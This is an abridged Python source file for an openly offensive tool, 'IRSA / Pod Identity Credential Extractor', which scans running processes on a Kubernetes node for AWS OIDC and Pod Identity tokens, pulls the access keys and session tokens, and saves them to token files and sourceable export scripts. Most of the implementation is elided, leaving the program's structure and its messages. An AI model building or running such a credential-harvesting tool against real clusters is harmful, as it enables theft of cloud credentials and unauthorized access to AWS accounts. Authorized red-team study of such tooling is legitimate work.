...
def print_banner():
 ...
 / _// ,< _\ \/ __/ __/ _ `/ __/ __/
/___/_/|_/___/\__/_/  \_,_/\__/\__/ 
                                                                                     ░        
"""
    print(f"{GREEN}{banner}")
    print(f"{CYAN}        IRSA / Pod Identity Credential Extractor")
    print(RESET)
...
def dump_export_file(filename, creds):
    ...
    print(f"{GREEN}Export file written:{RESET} {filename}")
...
def save_token_to_file(token, name_prefix, index):
    ...
    with open(path, "w") as f:
        f.write(token)
    print(f"{BLUE}{name_prefix.capitalize()} token saved to:{RESET} {path}")
...
def main():
    ...
    print(f"{YELLOW}Scanning PIDs for IRSA / Pod Identity tokens...{RESET}\n")
    ...
    for pid in pids:
        ...
        if not args.keys_only:
            ...
            if run_cmd(cmd_check):
                print(f"{GREEN}Found OIDC token in PID {pid}{RESET}")
        ...
        if not args.tokens_only:
            ...
            if run_cmd(cmd_check):
                print(f"{GREEN}Found Pod Identity token in PID {pid}{RESET}")
                ...
                if creds and all(k in creds for k in ["AccessKeyId", "SecretAccessKey", "Token"]):
                    ...
                    print(f"{RED}Failed to fetch credentials via Pod Identity for PID {pid}{RESET}")
                continue

    if oidc_count == 0 and podid_count == 0:
        print(f"\n{RED}No credentials found.{RESET}")
    else:
        print(f"\n{CYAN}Done. Found {oidc_count} OIDC and {podid_count} Pod Identity credential sets.{RESET}")
        print(f"{YELLOW}To use:{RESET}")
        for i in range(1, oidc_count + 1):
            print(f"{BLUE}source oidc_{i}.sh  # token: tokens/oidc_{i}.token{RESET}")
        for i in range(1, podid_count + 1):
            print(f"{BLUE}source podidentity_{i}.sh  # token: tokens/podidentity_{i}.token{RESET}")
